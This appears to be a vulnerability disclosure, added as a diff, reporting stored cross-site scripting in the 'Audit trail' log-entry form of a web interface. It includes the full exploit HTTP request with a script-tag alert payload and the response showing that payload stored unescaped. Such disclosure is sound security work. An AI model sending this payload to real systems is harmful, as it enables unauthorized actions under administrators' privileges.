@@ -1,0 +1,58 @@
+An authenticated malicious actor can insert a malicious XSS payload via the "Add your own log entry" input in the "Audit trail" functionality "/state/audittrail". Then, the malicous payload will be stored in the Logs, and it is triggered when the "Audit trail" tab is visited. This would result in privilege escalation or unauthorized actions execution in the context of the privileges user (e.g. admin).
+
+User Input Sanitization should be implemented for fixing this issue.
+
+
+Below, evidence is provided.
+
+
+Malicious Request:
+POST /state/audittrail HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+Origin: http://1.1.1.1
+DNT: 1
+Connection: close
+Referer: http://1.1.1.1/state/audittrail
+Cookie: ksp=1510550243292352682
+Upgrade-Insecure-Requests: 1
+
+ksp_formID=form1&ksp_requestID=1&form_tf1=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&x=1&y=1
+
+
+
+Response:
+HTTP/1.0 200 OK
+Connection: close
+Content-Type: text/html
+Cache-Control: no-cache
+Pragma: no-cache
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"
+
+.......code.........
+....................
+
+<tr class="odd">
+<td> User Entry: <script>alert(1)</script></td>
+<td>admin</td>
+<td>0.0.0000 00:00:00</td>
+</tr>
+
+<tr class="odd">
+<td> User Entry: <script>alert(1)</script></td>
+<td>admin</td>
+<td>0.0.0000 00:00:00</td>
+</tr>
+
+.......code.........
+....................
+
+</html> 
